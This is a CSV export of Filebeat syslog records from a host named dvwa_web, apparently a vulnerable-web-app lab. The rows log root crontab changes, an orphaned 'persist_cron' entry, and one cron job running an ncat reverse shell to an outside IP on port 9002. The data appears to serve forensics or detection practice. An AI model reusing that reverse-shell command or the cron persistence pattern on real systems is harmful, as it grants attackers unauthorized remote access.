@timestamp,_id,_index,_score,agent.ephemeral_id,agent.hostname,agent.id,agent.name,agent.type,agent.version,command,cwd,ecs.version,event.dataset,event.ingested,event.kind,event.module,event.timezone,filename,fileset.name,host.architecture,host.containerized,host.hostname,host.id,host.ip,host.mac,host.name,host.os.codename,host.os.family,host.os.kernel,host.os.name,host.os.name.text,host.os.platform,host.os.type,host.os.version,input.type,log.file.path,log.offset,message,related.hosts,service.type,sid,tty,uid
"Oct 24, 2022 @ 23:25:20.574",j-pMC4QBDsc6tFfSorg-,.ds-filebeat-8.4.3-2022.10.24-000001,-,da3ac34e-d249-42e4-b93d-8241d2f9cefe,dvwa_web,42c19219-fdfa-4b27-974b-5122c5f243b5,dvwa_web,filebeat,8.4.3,-,-,1.12.0,system.syslog,"Oct 24, 2022 @ 23:25:20.574",event,system,+08:00,-,syslog,x86_64,FALSE,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,Debian GNU/Linux,debian,linux,11 (bullseye),log,/var/log/syslog,785,dvwa_web crontab[311746]: (root) REPLACE (root),dvwa_web,system,-,-,-
"Oct 24, 2022 @ 23:25:20.574",UOpMC4QBDsc6tFfSjrbB,.ds-filebeat-8.4.3-2022.10.24-000001,-,da3ac34e-d249-42e4-b93d-8241d2f9cefe,dvwa_web,42c19219-fdfa-4b27-974b-5122c5f243b5,dvwa_web,filebeat,8.4.3,-,-,1.12.0,system.syslog,"Oct 24, 2022 @ 23:25:20.574",event,system,+08:00,-,syslog,x86_64,FALSE,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,Debian GNU/Linux,debian,linux,11 (bullseye),log,/var/log/syslog,599,dvwa_web crontab[311741]: (root) LIST (root),dvwa_web,system,-,-,-
"Oct 24, 2022 @ 23:25:20.574",UepMC4QBDsc6tFfSjrbB,.ds-filebeat-8.4.3-2022.10.24-000001,-,da3ac34e-d249-42e4-b93d-8241d2f9cefe,dvwa_web,42c19219-fdfa-4b27-974b-5122c5f243b5,dvwa_web,filebeat,8.4.3,-,-,1.12.0,system.syslog,"Oct 24, 2022 @ 23:25:20.574",event,system,+08:00,-,syslog,x86_64,FALSE,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,Debian GNU/Linux,debian,linux,11 (bullseye),log,/var/log/syslog,660,dvwa_web crontab[311743]: (root) REPLACE (root),dvwa_web,system,-,-,-
"Oct 24, 2022 @ 23:25:20.574",UupMC4QBDsc6tFfSjrbB,.ds-filebeat-8.4.3-2022.10.24-000001,-,da3ac34e-d249-42e4-b93d-8241d2f9cefe,dvwa_web,42c19219-fdfa-4b27-974b-5122c5f243b5,dvwa_web,filebeat,8.4.3,-,-,1.12.0,system.syslog,"Oct 24, 2022 @ 23:25:20.574",event,system,+08:00,-,syslog,x86_64,FALSE,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,Debian GNU/Linux,debian,linux,11 (bullseye),log,/var/log/syslog,724,dvwa_web crontab[311744]: (root) LIST (root),dvwa_web,system,-,-,-
"Oct 24, 2022 @ 23:25:20.574",x-pNC4QBDsc6tFfSUMG0,.ds-filebeat-8.4.3-2022.10.24-000001,-,da3ac34e-d249-42e4-b93d-8241d2f9cefe,dvwa_web,42c19219-fdfa-4b27-974b-5122c5f243b5,dvwa_web,filebeat,8.4.3,-,-,1.12.0,system.syslog,"Oct 24, 2022 @ 23:25:20.574",event,system,+08:00,-,syslog,x86_64,FALSE,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,Debian GNU/Linux,debian,linux,11 (bullseye),log,/var/log/syslog,928,dvwa_web CRON[311780]: (root) CMD (ncat -e /bin/sh 123.123.123.250 9002),dvwa_web,system,-,-,-
"Oct 24, 2022 @ 23:25:20.574",COpNC4QBDsc6tFfSPcFl,.ds-filebeat-8.4.3-2022.10.24-000001,-,da3ac34e-d249-42e4-b93d-8241d2f9cefe,dvwa_web,42c19219-fdfa-4b27-974b-5122c5f243b5,dvwa_web,filebeat,8.4.3,-,-,1.12.0,system.syslog,"Oct 24, 2022 @ 23:25:20.574",event,system,+08:00,-,syslog,x86_64,FALSE,dvwa_web,bc7bc6b9453f4089b9bfee6b38b5fc6f,"123.123.123.123, 10.10.10.10","02:42:0a:0a:0a:0a, 02:42:7b:7b:7b:7b",dvwa_web,bullseye,debian,5.15.0-52-generic,Debian GNU/Linux,Debian GNU/Linux,debian,linux,11 (bullseye),log,/var/log/syslog,849,dvwa_web cron[303153]: (persist_cron) ORPHAN (no passwd entry),dvwa_web,system,-,-,-
